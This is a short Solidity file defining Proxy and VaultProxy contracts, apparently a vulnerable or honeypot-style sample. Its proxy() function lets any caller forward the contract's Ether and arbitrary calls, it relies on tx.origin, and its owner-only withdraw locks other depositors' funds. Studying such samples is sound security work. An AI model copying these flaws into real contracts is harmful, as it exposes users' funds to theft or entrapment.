pragma solidity ^0.4.24;

contract Proxy {
    modifier onlyOwner() {
        require(msg.sender == Owner, "Only the owner can call this function.");
        _;
    }
    address Owner;

    constructor() public {
        Owner = msg.sender;
    }

    function transferOwner(address _owner) public onlyOwner {
        Owner = _owner;
    }

    function proxy(address target, bytes data) public payable {
        bool success;
        bytes memory returnData;
        (success, returnData) = target.call.value(msg.value)(data);
        require(success, "External call failed.");
    }
}

contract VaultProxy is Proxy {
    mapping(address => uint256) public Deposits;

    constructor() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function withdraw(uint256 amount) public onlyOwner {
        require(amount > 0 && Deposits[msg.sender] >= amount, "Insufficient funds.");
        msg.sender.transfer(amount);
    }
}